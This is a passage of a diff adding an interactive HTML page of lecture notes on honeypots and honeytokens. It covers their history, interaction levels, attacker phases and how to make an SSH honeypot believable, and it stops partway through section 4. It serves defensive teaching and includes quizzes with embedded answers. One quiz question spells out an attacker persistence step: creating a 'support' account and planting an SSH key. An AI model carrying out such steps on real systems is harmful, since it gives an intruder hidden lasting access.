@@ -1,0 +1,1193 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Honeypots &amp; Honeytokens — Lecture Notes</title>
+<style>
+:root{
+  --bg:#fbfaf7; --panel:#ffffff; --panel2:#f4f1ea; --ink:#1d1b17; --muted:#6b665c; --line:#e3ded2;
+  --honey:#d98e04; --honey-soft:#fdf1d8; --accent:#2f5d8a; --accent-soft:#e6eef7;
+  --ok:#2e7d4f; --ok-soft:#e3f3e9; --bad:#b3261e; --bad-soft:#fbe6e4; --warn:#a15c00;
+  --term:#14161a; --term-ink:#d6e2d0; --term-dim:#7d8a78;
+  --shadow:0 1px 2px rgba(0,0,0,.05),0 4px 16px rgba(0,0,0,.05);
+  --radius:12px; --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#15140f; --panel:#1e1c17; --panel2:#262319; --ink:#eeeae0; --muted:#a39d90; --line:#36322a;
+    --honey:#f2b233; --honey-soft:#3a2d12; --accent:#7fb0e0; --accent-soft:#1d2a38;
+    --ok:#6fcf97; --ok-soft:#173022; --bad:#ff8a80; --bad-soft:#3a1a18; --warn:#f2b233;
+    --shadow:0 1px 2px rgba(0,0,0,.3),0 4px 16px rgba(0,0,0,.25);
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#15140f; --panel:#1e1c17; --panel2:#262319; --ink:#eeeae0; --muted:#a39d90; --line:#36322a;
+  --honey:#f2b233; --honey-soft:#3a2d12; --accent:#7fb0e0; --accent-soft:#1d2a38;
+  --ok:#6fcf97; --ok-soft:#173022; --bad:#ff8a80; --bad-soft:#3a1a18; --warn:#f2b233;
+  --shadow:0 1px 2px rgba(0,0,0,.3),0 4px 16px rgba(0,0,0,.25);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.65 var(--sans);-webkit-font-smoothing:antialiased}
+a{color:var(--accent)}
+code,kbd,pre{font-family:var(--mono);font-size:.9em}
+code{background:var(--panel2);padding:.1em .35em;border-radius:5px}
+h1,h2,h3{line-height:1.25;letter-spacing:-.01em}
+h2{font-size:1.7rem;margin:0 0 .3rem}
+h3{font-size:1.15rem;margin:1.6rem 0 .5rem}
+p{margin:.6rem 0}
+ul{padding-left:1.25rem}
+li{margin:.25rem 0}
+.wrap{display:grid;grid-template-columns:260px minmax(0,1fr);min-height:100vh}
+/* sidebar */
+nav.toc{position:sticky;top:0;height:100vh;overflow:auto;padding:22px 16px;border-right:1px solid var(--line);background:var(--panel)}
+.brand{display:flex;gap:10px;align-items:center;font-weight:700;margin-bottom:14px}
+.brand svg{flex:none}
+.toc ol{list-style:none;padding:0;margin:0;counter-reset:s}
+.toc li{margin:0}
+.toc a{display:flex;gap:8px;align-items:center;padding:6px 8px;border-radius:8px;color:var(--muted);text-decoration:none;font-size:.92rem}
+.toc a:hover{background:var(--panel2);color:var(--ink)}
+.toc a.active{background:var(--honey-soft);color:var(--ink);font-weight:600}
+.toc a .tick{margin-left:auto;width:16px;height:16px;border-radius:50%;border:1.5px solid var(--line);flex:none;display:grid;place-items:center;font-size:10px}
+.toc a .tick.done{background:var(--ok);border-color:var(--ok);color:#fff}
+.tools{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px;padding-top:14px;border-top:1px solid var(--line)}
+.btn{font:inherit;font-size:.85rem;border:1px solid var(--line);background:var(--panel);color:var(--ink);padding:6px 11px;border-radius:8px;cursor:pointer;transition:background .15s,transform .1s}
+.btn:hover{background:var(--panel2)}
+.btn:active{transform:translateY(1px)}
+.btn.primary{background:var(--honey);border-color:var(--honey);color:#1d1b17;font-weight:600}
+.btn.primary:hover{filter:brightness(1.05)}
+.btn.danger{color:var(--bad)}
+.progress{height:6px;background:var(--panel2);border-radius:4px;overflow:hidden;margin-top:10px}
+.progress>i{display:block;height:100%;width:0;background:var(--honey);transition:width .4s}
+.small{font-size:.82rem;color:var(--muted)}
+#readbar{position:fixed;top:0;left:0;height:3px;background:var(--honey);width:0;z-index:50}
+main{padding:0 40px 80px;max-width:980px}
+section.chapter{padding:56px 0 24px;border-bottom:1px solid var(--line)}
+.kicker{font-size:.78rem;text-transform:uppercase;letter-spacing:.12em;color:var(--honey);font-weight:700}
+.lead{font-size:1.1rem;color:var(--muted)}
+/* hero */
+.hero{padding:48px 0 30px;display:grid;grid-template-columns:1.1fr 1fr;gap:28px;align-items:center}
+.hero h1{font-size:2.6rem;margin:.2rem 0 .6rem}
+.hero svg{width:100%;height:auto}
+/* cards */
+.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:18px 20px;box-shadow:var(--shadow);margin:16px 0}
+.grid2{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:14px}
+.grid3{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:14px}
+.grid4{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:12px}
+.mini{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px}
+.mini b{display:block;margin-bottom:4px}
+.callout{border-left:4px solid var(--honey);background:var(--honey-soft);padding:12px 16px;border-radius:0 10px 10px 0;margin:16px 0}
+.callout.blue{border-color:var(--accent);background:var(--accent-soft)}
+.callout.red{border-color:var(--bad);background:var(--bad-soft)}
+.callout b:first-child{display:block;margin-bottom:2px}
+.def{font-size:1.1rem;border:1px dashed var(--honey);border-radius:12px;padding:14px 18px;background:var(--panel)}
+table{width:100%;border-collapse:collapse;font-size:.94rem;margin:12px 0}
+th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{background:var(--panel2);font-weight:600}
+.tablewrap{overflow-x:auto;border:1px solid var(--line);border-radius:10px}
+.tablewrap table{margin:0}
+.tag{display:inline-block;font-size:.72rem;font-weight:700;padding:2px 8px;border-radius:99px;background:var(--panel2);color:var(--muted);letter-spacing:.02em}
+.tag.recon{background:#dbeafe;color:#1e3a8a}.tag.privesc{background:#fde68a;color:#78350f}.tag.persist{background:#e9d5ff;color:#581c87}
+.tag.steal{background:#fecaca;color:#7f1d1d}.tag.malware{background:#fca5a5;color:#450a0a}.tag.cover{background:#d1d5db;color:#111827}.tag.token{background:#f59e0b;color:#1d1b17}
+.tag.info{background:#e5e7eb;color:#374151}
+/* reveal animation */
+.reveal{opacity:0;transform:translateY(14px);transition:opacity .6s ease,transform .6s ease}
+.reveal.in{opacity:1;transform:none}
+@media (prefers-reduced-motion: reduce){.reveal{opacity:1;transform:none;transition:none}*{animation:none!important;transition:none!important}}
+/* slider widget */
+.spectrum input[type=range]{width:100%;accent-color:var(--honey)}
+.spec-labels{display:flex;justify-content:space-between;font-size:.82rem;color:var(--muted)}
+.meter{display:grid;grid-template-columns:140px 1fr 40px;gap:10px;align-items:center;margin:7px 0;font-size:.9rem}
+.meter .bar{height:10px;background:var(--panel2);border-radius:6px;overflow:hidden}
+.meter .bar i{display:block;height:100%;background:var(--honey);transition:width .45s cubic-bezier(.2,.8,.2,1)}
+.meter .bar i.risk{background:var(--bad)}
+.spec-desc{min-height:3.2em}
+/* terminal */
+.termwrap{display:grid;grid-template-columns:1.25fr 1fr;gap:12px}
+.term{background:var(--term);color:var(--term-ink);border-radius:10px;font:13.5px/1.5 var(--mono);height:390px;display:flex;flex-direction:column;overflow:hidden;border:1px solid #000}
+.term .bar{display:flex;gap:6px;align-items:center;padding:7px 10px;background:#22252b;color:#9aa;font-size:12px}
+.term .dot{width:10px;height:10px;border-radius:50%;background:#ff5f57}.term .dot:nth-child(2){background:#febc2e}.term .dot:nth-child(3){background:#28c840}
+.term .out{flex:1;overflow:auto;padding:10px 12px;white-space:pre-wrap;word-break:break-word}
+.term .in{display:flex;padding:0 12px 10px}
+.term .in span{color:#8bd17c;white-space:nowrap}
+.term input{flex:1;background:transparent;border:0;outline:0;color:var(--term-ink);font:inherit;margin-left:6px}
+.term .p{color:#8bd17c}
+.term .dim{color:var(--term-dim)}
+.log{background:var(--panel);border:1px solid var(--line);border-radius:10px;height:390px;display:flex;flex-direction:column;overflow:hidden}
+.log header{padding:8px 12px;background:var(--panel2);font-size:.85rem;font-weight:600;display:flex;justify-content:space-between;align-items:center}
+.log .rows{flex:1;overflow:auto;font:12px/1.45 var(--mono);padding:6px 8px}
+.log .row{padding:5px 6px;border-bottom:1px dashed var(--line);animation:flash .9s ease}
+@keyframes flash{from{background:var(--honey-soft)}to{background:transparent}}
+.chips{display:flex;flex-wrap:wrap;gap:6px;margin:8px 0}
+.chip{font:12px var(--mono);border:1px solid var(--line);background:var(--panel2);color:var(--ink);padding:3px 8px;border-radius:6px;cursor:pointer}
+.chip:hover{border-color:var(--honey)}
+.phasebar{display:flex;gap:4px;margin-top:8px;flex-wrap:wrap}
+.phasebar span{flex:1;min-width:80px;text-align:center;font-size:.72rem;padding:5px 2px;border-radius:6px;background:var(--panel2);color:var(--muted);transition:all .3s}
+.phasebar span.hit{color:#1d1b17;background:var(--honey);font-weight:700}
+.switch{display:inline-flex;align-items:center;gap:8px;font-size:.88rem;cursor:pointer;user-select:none}
+.switch input{accent-color:var(--honey);width:16px;height:16px}
+/* file explorer */
+.fx{display:grid;grid-template-columns:200px 1fr;border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--panel);min-height:330px}
+.fx .tree{background:var(--panel2);padding:10px;font-size:.9rem}
+.fx .tree div{padding:5px 8px;border-radius:6px;cursor:pointer}
+.fx .tree div.sel{background:var(--honey-soft);font-weight:600}
+.fx .files{padding:10px}
+.file{display:flex;align-items:center;gap:10px;padding:8px 10px;border-radius:8px;cursor:pointer;font-size:.92rem;border:1px solid transparent}
+.file:hover{background:var(--panel2)}
+.file.reveal-token{border-color:var(--honey);background:var(--honey-soft)}
+.file .ic{width:22px;text-align:center}
+.preview{margin-top:8px;font:12.5px/1.5 var(--mono);background:var(--panel2);border-radius:8px;padding:10px;white-space:pre-wrap;min-height:70px}
+.alert{position:fixed;right:20px;bottom:20px;max-width:360px;background:var(--bad);color:#fff;padding:14px 16px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.3);transform:translateY(140%);transition:transform .35s cubic-bezier(.2,.9,.3,1.2);z-index:80;font-size:.9rem}
+.alert.show{transform:none}
+.alert b{display:block;font-size:1rem;margin-bottom:3px}
+.alert .pulse{display:inline-block;width:9px;height:9px;border-radius:50%;background:#fff;margin-right:6px;animation:pulse 1s infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,255,255,.7)}100%{box-shadow:0 0 0 10px rgba(255,255,255,0)}}
+/* svg diagrams */
+.diagram{width:100%;height:auto;display:block}
+.diagram text{font-family:var(--sans);fill:var(--ink)}
+.diagram .lbl{font-size:13px}
+.diagram .sub{font-size:11px;fill:var(--muted)}
+.diagram .box{fill:var(--panel);stroke:var(--line);stroke-width:1.5}
+.diagram .box.hp{fill:var(--honey-soft);stroke:var(--honey)}
+.diagram .box.ids{fill:var(--accent-soft);stroke:var(--accent)}
+.diagram .box.bad{fill:var(--bad-soft);stroke:var(--bad)}
+.diagram .wire{stroke:var(--muted);stroke-width:1.5;fill:none;stroke-dasharray:4 4}
+.diagram .flow{animation:dash 1.2s linear infinite}
+@keyframes dash{to{stroke-dashoffset:-16}}
+.diagram .clickable{cursor:pointer}
+.diagram .clickable:hover .box{stroke:var(--honey);stroke-width:2.5}
+.diagram .clickable.on .box{stroke:var(--honey);stroke-width:3}
+.infobox{min-height:4.5em;background:var(--panel2);border-radius:10px;padding:12px 14px;font-size:.93rem}
+/* timeline */
+.timeline{position:relative;margin:18px 0;padding-left:26px}
+.timeline:before{content:"";position:absolute;left:8px;top:4px;bottom:4px;width:2px;background:var(--line)}
+.tl{position:relative;margin:0 0 14px}
+.tl:before{content:"";position:absolute;left:-23px;top:7px;width:12px;height:12px;border-radius:50%;background:var(--honey);box-shadow:0 0 0 4px var(--honey-soft)}
+.tl b{color:var(--honey)}
+/* flip cards */
+.flip{perspective:900px;height:150px;cursor:pointer}
+.flip .in{position:relative;width:100%;height:100%;transition:transform .6s;transform-style:preserve-3d}
+.flip.on .in{transform:rotateY(180deg)}
+.flip .f,.flip .b{position:absolute;inset:0;backface-visibility:hidden;border-radius:12px;padding:14px;display:flex;align-items:center;justify-content:center;text-align:center;border:1px solid var(--line)}
+.flip .f{background:var(--panel);font-weight:700;font-size:1.05rem}
+.flip .b{background:var(--honey-soft);transform:rotateY(180deg);font-size:.88rem}
+/* quiz */
+.quiz{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:16px 18px;margin:18px 0}
+.quiz .qh{font-size:.78rem;text-transform:uppercase;letter-spacing:.1em;color:var(--accent);font-weight:700}
+.quiz .q{font-weight:600;margin:6px 0 10px}
+.quiz .opts{display:grid;gap:7px}
+.quiz button.opt{text-align:left;font:inherit;font-size:.94rem;padding:9px 12px;border:1px solid var(--line);border-radius:9px;background:var(--panel);color:var(--ink);cursor:pointer;transition:all .2s}
+.quiz button.opt:hover:not(:disabled){border-color:var(--accent);background:var(--accent-soft)}
+.quiz button.opt.right{border-color:var(--ok);background:var(--ok-soft)}
+.quiz button.opt.wrong{border-color:var(--bad);background:var(--bad-soft);animation:shake .35s}
+@keyframes shake{25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}
+.quiz .fb{margin-top:10px;font-size:.92rem;display:none}
+.quiz .fb.show{display:block;animation:fade .4s}
+@keyframes fade{from{opacity:0}to{opacity:1}}
+/* student notes */
+.mynotes{margin-top:22px;border:1px dashed var(--accent);border-radius:12px;background:var(--accent-soft)}
+.mynotes summary{padding:10px 14px;cursor:pointer;font-weight:600;color:var(--accent);list-style:none;display:flex;justify-content:space-between}
+.mynotes summary::-webkit-details-marker{display:none}
+.mynotes textarea{width:calc(100% - 28px);margin:0 14px 6px;min-height:120px;border:1px solid var(--line);border-radius:8px;padding:10px;font:14px/1.5 var(--sans);background:var(--panel);color:var(--ink);resize:vertical}
+.mynotes .row{display:flex;justify-content:space-between;align-items:center;padding:0 14px 12px;gap:10px;flex-wrap:wrap}
+.saved{font-size:.78rem;color:var(--muted)}
+.understood{display:inline-flex;align-items:center;gap:8px;font-size:.9rem;margin-top:14px;cursor:pointer;user-select:none}
+.understood input{width:17px;height:17px;accent-color:var(--ok)}
+/* stepper */
+.stepper{display:flex;gap:6px;flex-wrap:wrap;margin:10px 0}
+.stepper button{flex:1;min-width:110px}
+.stepper button.on{background:var(--honey);border-color:var(--honey);color:#1d1b17;font-weight:600}
+pre.code{background:var(--term);color:var(--term-ink);padding:14px 16px;border-radius:10px;overflow:auto;font-size:12.5px;line-height:1.55;position:relative}
+.codehead{display:flex;justify-content:space-between;align-items:center;margin-top:12px}
+.c-k{color:#ffcb6b}.c-s{color:#c3e88d}.c-c{color:#7d8a78;font-style:italic}.c-f{color:#82aaff}
+/* shadow widget */
+.shadow-ctl{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0}
+.counter{display:flex;gap:14px;font-size:.88rem;color:var(--muted);flex-wrap:wrap}
+.counter b{color:var(--ink)}
+/* footer */
+footer{padding:30px 0;color:var(--muted);font-size:.85rem}
+.menu-btn{display:none}
+@media (max-width:900px){
+  .wrap{grid-template-columns:minmax(0,1fr)}
+  nav.toc{position:fixed;left:0;top:0;width:280px;z-index:60;transform:translateX(-100%);transition:transform .3s;box-shadow:var(--shadow)}
+  nav.toc.open{transform:none}
+  .menu-btn{display:inline-block;position:fixed;top:10px;left:10px;z-index:70}
+  main{padding:0 16px 60px}
+  .hero{grid-template-columns:minmax(0,1fr);padding-top:60px}
+  .grid2,.grid3,.termwrap{grid-template-columns:minmax(0,1fr)}
+  .grid4{grid-template-columns:repeat(2,minmax(0,1fr))}
+  .fx{grid-template-columns:minmax(0,1fr)}
+  .meter{grid-template-columns:110px 1fr 34px}
+}
+@media print{
+  nav.toc,.menu-btn,#readbar,.alert,.quiz,.chips,.shadow-ctl,.tools{display:none!important}
+  .wrap{display:block} main{max-width:none;padding:0}
+  .reveal{opacity:1;transform:none}
+  .mynotes{border:1px solid #999;background:none}
+  .mynotes[open] textarea,.mynotes textarea{display:block;border:0;min-height:0;height:auto}
+  section.chapter{page-break-inside:avoid}
+  .term .in{display:none}
+}
+</style>
+</head>
+<body>
+<div id="readbar"></div>
+<button class="btn menu-btn" id="menuBtn" aria-label="Open contents">☰ Contents</button>
+<div class="wrap">
+<nav class="toc" id="toc">
+  <div class="brand">
+    <svg width="28" height="28" viewBox="0 0 32 32" aria-hidden="true"><path d="M16 2l12 7v14l-12 7-12-7V9z" fill="var(--honey)"/><path d="M16 9l6 3.5v7L16 23l-6-3.5v-7z" fill="var(--panel)"/></svg>
+    Honeypots &amp; Honeytokens
+  </div>
+  <ol id="tocList"></ol>
+  <div class="progress" title="Sections marked as understood"><i id="progBar"></i></div>
+  <div class="small" id="progTxt" style="margin-top:6px">0 of 0 sections understood</div>
+  <div class="tools">
+    <button class="btn primary" id="exportBtn" title="Download your notes as a Markdown file">⬇ Export my notes</button>
+    <button class="btn" id="importBtn" title="Load a previously exported notes file">⬆ Import</button>
+    <button class="btn" id="printBtn">🖨 Print</button>
+    <button class="btn" id="themeBtn">◐ Theme</button>
+    <button class="btn danger" id="resetBtn">Reset</button>
+    <input type="file" id="importFile" accept=".json,.md,.txt" hidden>
+  </div>
+  <p class="small" style="margin-top:12px">Your notes, ticks and quiz answers are saved in this browser automatically. Use <b>Export</b> to keep a copy or move to another computer.</p>
+</nav>
+
+<main id="main">
+
+<!-- ============ HERO ============ -->
+<header class="hero">
+  <div>
+    <div class="kicker">Cyber Security · Lecture Notes</div>
+    <h1>Honeypots &amp; Honeytokens</h1>
+    <p class="lead">Deception as a defence: instead of only keeping attackers out, we build things that <em>look</em> valuable, let attackers touch them, and learn from every move they make.</p>
+    <div class="small">How to use this page: read each section, try the interactive parts, answer the check questions, write your own notes in the blue boxes and tick “I understand this section”.</div>
+  </div>
+  <svg viewBox="0 0 360 240" role="img" aria-label="Attack traffic being drawn toward a honeypot instead of the real servers">
+    <defs>
+      <radialGradient id="g1" cx="50%" cy="40%" r="60%"><stop offset="0" stop-color="#ffd166"/><stop offset="1" stop-color="#d98e04"/></radialGradient>
+    </defs>
+    <rect x="250" y="20" width="90" height="56" rx="8" fill="var(--panel)" stroke="var(--line)" stroke-width="1.5"/>
+    <text x="295" y="45" text-anchor="middle" font-size="12" fill="var(--ink)">Real servers</text>
+    <text x="295" y="62" text-anchor="middle" font-size="10" fill="var(--muted)">untouched</text>
+    <g transform="translate(240,130)">
+      <path d="M10 20 Q10 0 55 0 Q100 0 100 20 L95 85 Q55 100 15 85Z" fill="url(#g1)"/>
+      <ellipse cx="55" cy="20" rx="45" ry="10" fill="#a86b00"/>
+      <text x="55" y="62" text-anchor="middle" font-size="13" font-weight="700" fill="#1d1b17">HONEYPOT</text>
+      <text x="55" y="78" text-anchor="middle" font-size="10" fill="#3b2a00">logging…</text>
+    </g>
+    <g id="heroAttackers"></g>
+    <circle cx="30" cy="40" r="14" fill="var(--bad-soft)" stroke="var(--bad)"/><text x="30" y="44" text-anchor="middle" font-size="12">🤖</text>
+    <circle cx="30" cy="120" r="14" fill="var(--bad-soft)" stroke="var(--bad)"/><text x="30" y="124" text-anchor="middle" font-size="12">🕵</text>
+    <circle cx="30" cy="200" r="14" fill="var(--bad-soft)" stroke="var(--bad)"/><text x="30" y="204" text-anchor="middle" font-size="12">🤖</text>
+    <path class="wire flow" d="M44 40 C150 40 180 160 250 170" stroke="var(--bad)" stroke-width="1.5" fill="none" stroke-dasharray="4 4"/>
+    <path class="wire flow" d="M44 120 C140 120 190 170 250 180" stroke="var(--bad)" stroke-width="1.5" fill="none" stroke-dasharray="4 4"/>
+    <path class="wire flow" d="M44 200 C140 200 200 195 250 190" stroke="var(--bad)" stroke-width="1.5" fill="none" stroke-dasharray="4 4"/>
+    <g id="heroDots"></g>
+  </svg>
+</header>
+
+<!-- ============ 1 ============ -->
+<section class="chapter" id="s1" data-title="1. What is a honeypot?">
+  <div class="kicker">Section 1</div>
+  <h2>What is a honeypot?</h2>
+  <div class="def reveal"><b>Honeypot</b> — a system or resource that is deliberately made to look vulnerable or interesting to attackers, so that we can <b>attract, detect, study</b> and sometimes <b>deflect</b> them. It has no production purpose, so <em>any</em> interaction with it is suspicious by definition.</div>
+
+  <p>A honeypot is <b>not</b> about protecting the honeypot itself. Its value comes from being probed, attacked and even compromised — while we watch. It looks real, but it is <b>isolated</b> from real systems, so nothing an attacker does there can reach production.</p>
+
+  <div class="grid4 reveal">
+    <div class="mini"><b>🧲 Attract</b>Look like a juicy target: open ports, old software, “interesting” files.</div>
+    <div class="mini"><b>🚨 Detect</b>No legitimate user should ever touch it — every hit is an alert.</div>
+    <div class="mini"><b>🔬 Study</b>Record commands, tools, malware and timing to learn how attackers work.</div>
+    <div class="mini"><b>↪ Deflect</b>Waste the attacker’s time and effort on a fake target.</div>
+  </div>
+
+  <h3>A short history</h3>
+  <div class="timeline reveal">
+    <div class="tl"><b>1986–89</b> — Clifford Stoll (Lawrence Berkeley Lab) tracks a hacker by planting fake “SDInet” military files to keep him connected long enough to trace — an early honeytoken. Told in <i>The Cuckoo’s Egg</i>.</div>
+    <div class="tl"><b>1991</b> — Bill Cheswick (AT&amp;T) publishes <i>An Evening with Berferd</i>: he lures an intruder into a jailed, fake environment and studies him for months.</div>
+    <div class="tl"><b>1997</b> — Fred Cohen releases the <i>Deception Toolkit</i>, one of the first freely available honeypot tools.</div>
+    <div class="tl"><b>1999</b> — Lance Spitzner founds the <b>Honeynet Project</b>; honeypots become a research field.</div>
+    <div class="tl"><b>2003</b> — The term <b>honeytoken</b> appears (Augusto Paes de Barros) and is popularised by Spitzner.</div>
+    <div class="tl"><b>2005</b> — Anagnostakis et al. introduce <b>shadow honeypots</b> (USENIX Security).</div>
+    <div class="tl"><b>Today</b> — “Deception technology” products, Canarytokens, cloud honeypots and LLM-driven honeypots.</div>
+  </div>
+
+  <h3>Production vs research honeypots</h3>
+  <div class="tablewrap reveal"><table>
+    <tr><th></th><th>Production honeypot</th><th>Research honeypot</th></tr>
+    <tr><td><b>Goal</b></td><td>Protect <em>this</em> organisation: early warning inside the network</td><td>Learn about attackers in general: tools, malware, trends</td></tr>
+    <tr><td><b>Typical interaction</b></td><td>Low / medium</td><td>Medium / high</td></tr>
+    <tr><td><b>Who runs it</b></td><td>Company security teams (SOC)</td><td>Universities, CERTs, threat-intel teams</td></tr>
+    <tr><td><b>Output</b></td><td>Alerts</td><td>Datasets, malware samples, papers, signatures</td></tr>
+  </table></div>
+
+  <div class="quiz" data-id="q1" data-answer="2">
+    <div class="qh">Check yourself</div>
+    <div class="q">Why does a honeypot produce very few false positives?</div>
+    <div class="opts">
+      <button class="opt">It uses a better detection algorithm than an IDS.</button>
+      <button class="opt">It blocks all traffic from unknown IPs.</button>
+      <button class="opt">It has no legitimate users, so any interaction is already suspicious.</button>
+      <button class="opt">It only logs traffic that matches known malware signatures.</button>
+    </div>
+    <div class="fb">A honeypot needs no “clever” detection: since nothing legitimate uses it, the mere fact that someone connected is the signal.</div>
+  </div>
+</section>
+
+<!-- ============ 2 ============ -->
+<section class="chapter" id="s2" data-title="2. Interaction levels">
+  <div class="kicker">Section 2</div>
+  <h2>Low, medium &amp; high interaction</h2>
+  <p>Honeypots are classified by how much of a real system the attacker can interact with. More interaction gives us more information — but also more <b>risk</b> and more <b>work</b>.</p>
+  <ul>
+    <li><b>Low interaction</b> — emulated services with a small subset of functionality. Instead of a whole server you only implement e.g. a login banner and a password prompt. Cheap and safe; attackers detect it quickly.</li>
+    <li><b>Medium interaction</b> — a richer emulation: a fake shell with a fake file system, fake command output, downloads are captured but never executed. (Example: <code>Cowrie</code> SSH/Telnet honeypot.)</li>
+    <li><b>High interaction</b> — a real operating system with real services. The attacker interacts with it just like any machine. Maximum information, maximum risk: if containment fails, the attacker can use it to attack others.</li>
+  </ul>
+
+  <div class="card spectrum reveal">
+    <b>Try it — slide along the interaction spectrum</b>
+    <input type="range" min="0" max="2" step="1" value="0" id="specRange" aria-label="Interaction level">
+    <div class="spec-labels"><span>Low</span><span>Medium</span><span>High</span></div>
+    <div id="specMeters" style="margin-top:12px"></div>
+    <div class="infobox spec-desc" id="specDesc"></div>
+  </div>
+
+  <h3>What do we collect?</h3>
+  <div class="grid4 reveal">
+    <div class="mini"><b>🌐 IP addresses</b>Source IPs, ASNs, geolocation, scanning ranges.</div>
+    <div class="mini"><b>🧭 Attack patterns</b>Order of commands, timing, which ports and paths are probed.</div>
+    <div class="mini"><b>🦠 Malware samples</b>Files the attacker downloads or uploads (hashes, binaries, scripts).</div>
+    <div class="mini"><b>🛠 Exploit techniques</b>Payloads, credentials tried, vulnerabilities targeted.</div>
+  </div>
+  <p>Common examples: fake web servers, SSH/Telnet honeypots, database honeypots (MySQL, MongoDB, Redis, Elasticsearch), industrial control system honeypots, and exposed fake AI/LLM endpoints.</p>
+
+  <div class="quiz" data-id="q2" data-answer="1">
+    <div class="qh">Check yourself</div>
+    <div class="q">You want to capture the full post-exploitation behaviour of skilled attackers. Which type do you choose, and what is the main cost?</div>
+    <div class="opts">
+      <button class="opt">Low interaction — it is too expensive to run.</button>
+      <button class="opt">High interaction — higher risk; it must be strongly contained and monitored.</button>
+      <button class="opt">Low interaction — attackers cannot detect it.</button>
+      <button class="opt">High interaction — it produces no useful data.</button>
+    </div>
+    <div class="fb">High interaction gives you the most realistic behaviour but a real OS can really be abused, so data control (outbound limits, isolation) is essential.</div>
+  </div>
+</section>
+
+<!-- ============ 3 ============ -->
+<section class="chapter" id="s3" data-title="3. Inside a honeypot: attackers">
+  <div class="kicker">Section 3</div>
+  <h2>What attackers do inside a honeypot</h2>
+  <p>Studies of SSH honeypots show a fairly consistent sequence of behaviour, although it differs between <b>bots</b>, <b>script kiddies</b> and <b>experienced attackers</b>. Bots usually run one preset script within seconds: download a payload from an IP address, run it, leave. Humans explore.</p>
+
+  <div class="stepper" id="phaseStepper"></div>
+  <div class="infobox" id="phaseInfo"></div>
+
+  <h3>Try it — you are the attacker, the log is the defender</h3>
+  <p class="small">This is a <b>simulated</b> medium-interaction SSH honeypot running entirely in your browser. Type commands (or click the suggestions). Watch the right-hand panel: this is what the defender sees. Then switch on <b>“poorly built honeypot”</b> and see how quickly a careful attacker would notice.</p>
+  <div class="chips" id="termChips"></div>
+  <div class="termwrap">
+    <div class="term" id="term">
+      <div class="bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span>&nbsp; ssh root@203.0.113.50</div>
+      <div class="out" id="termOut"></div>
+      <div class="in"><span id="termPrompt">root@web-prod-02:~#</span><input id="termIn" autocomplete="off" spellcheck="false" aria-label="Terminal input"></div>
+    </div>
+    <div class="log">
+      <header><span>🛡 Defender view — session log</span><button class="btn" id="logClear" style="padding:2px 8px;font-size:.75rem">clear</button></header>
+      <div class="rows" id="logRows"></div>
+    </div>
+  </div>
+  <div class="phasebar" id="phaseBar"></div>
+  <div style="margin-top:10px"><label class="switch"><input type="checkbox" id="badMode"> Poorly built honeypot (unrealistic responses)</label></div>
+
+  <div class="callout blue reveal"><b>Takeaway</b>Every phase leaves evidence in the honeypot log. That evidence becomes threat intelligence: IPs to block, malware hashes, the credentials attackers try, and the techniques they use (often mapped to MITRE ATT&amp;CK).</div>
+
+  <div class="quiz" data-id="q3" data-answer="3">
+    <div class="qh">Check yourself</div>
+    <div class="q">An attacker runs <code>useradd -m support</code> and adds an SSH key to <code>~/.ssh/authorized_keys</code>. Which phase is this?</div>
+    <div class="opts">
+      <button class="opt">Reconnaissance</button>
+      <button class="opt">Covering tracks</button>
+      <button class="opt">Data stealing</button>
+      <button class="opt">Persistence</button>
+    </div>
+    <div class="fb">Creating accounts and planting keys lets the attacker come back later — that is persistence.</div>
+  </div>
+</section>
+
+<!-- ============ 4 ============ -->
+<section class="chapter" id="s4" data-title="4. Building a believable honeypot">
+  <div class="kicker">Section 4</div>
+  <h2>Building a believable honeypot</h2>
+  <p>Attackers test whether a system is real, just as we test whether they are malicious. A honeypot that is easy to <b>fingerprint</b> collects only bot traffic, and skilled attackers simply leave (or feed you false data). Building a good honeypot therefore starts with research: learn how attackers work and what a real system of that kind looks like.</p>
+
+  <h3>Realism checklist — SSH honeypot on Linux</h3>
+  <div class="grid2 reveal">
+    <div class="mini"><b>📂 File system</b><code>ls</code> returns proper, lived-in results; realistic files under <code>/etc</code>, <code>/var/log</code>, home directories with history.</div>
+    <div class="mini"><b>⏱ Timing</b>Commands take realistic time; downloads are not instant; the clock and uptime make sense.</div>
+    <div class="mini"><b>🖥 Hardware</b>Believable CPU, memory, disk (<code>nproc</code>, <code>free -m</code>, <code>/proc/cpuinfo</code>).</div>
+    <div class="mini"><b>🔖 Defaults changed</b>Hostnames, banners, kernel versions and users must not be the tool’s defaults — attackers keep lists of known honeypot fingerprints.</div>
+    <div class="mini"><b>🧩 Consistency</b>If <code>echo hi &gt; a.txt</code> then <code>cat a.txt</code> must show <code>hi</code>. State must persist.</div>
+    <div class="mini"><b>🍯 Bait</b>Plant fake but plausible data (configs, DB dumps, credentials) — i.e. honeytokens — to see what attackers go after.</div>
+  </div>
+
